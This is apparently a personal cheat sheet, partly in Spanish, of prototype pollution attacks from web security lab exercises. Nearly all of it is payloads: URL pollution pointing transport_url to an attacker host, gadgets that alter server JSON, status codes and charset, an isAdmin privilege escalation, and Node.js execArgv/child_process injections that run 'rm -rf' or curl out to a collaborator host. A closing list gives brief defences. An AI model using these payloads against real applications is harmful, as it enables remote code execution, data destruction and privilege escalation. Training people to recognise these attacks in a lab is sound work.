https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//

vulnerable-website.com/?__proto__[foo]=bar
vulnerable-website.com/?__proto__.foo=bar

Object.prototype.foo

Object.defineProperty(Object.prototype, 'search', {
    get() {
        console.trace();
        return 'polluted';
    }
})

myObject.constructor.prototype = myObject.__proto__

Cosas que se pueden cambiar en el backend:
- Cambiar identación JSON (ver cambios en raw)
    
"__proto__":{
    "json spaces": 1000
}

- Cambiar estatus de error a 399 < status < 500

"__proto__":{
    "status": 405,
	"statusCode": 405
}

- Sobrescribir charset

"__proto__":{
    "content-type": "application/json; charset=utf-7"
}

+AGYAbwBv- (utf-7) = foo (utf-8)

Temas relacionados:
 - Bypassing flawed key sanitization
 - Prototype pollution via the constructor
 
"constructor": {"prototype": {"isAdmin":true}}

RCE child_process.spawn() y child_process.fork()
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}

"execArgv": [
    "--eval=require('<module>')"
]

"__proto__": {
"execArgv": [
"--eval=require('child_process').spawn('rm', ['-rf','/home/carlos/morale.txt'])"
]}

"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}

"shell":"vim",
"input":":! <command>\n"

Para probar curls:
https://app.interactsh.com/
http://webhook.site/
https://requestbin.net/onboard
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}


Solución:
- Object.seal() << Object.freeze()
- Whitelist << Blacklist
- Object.create(null)
- Use Map or Set
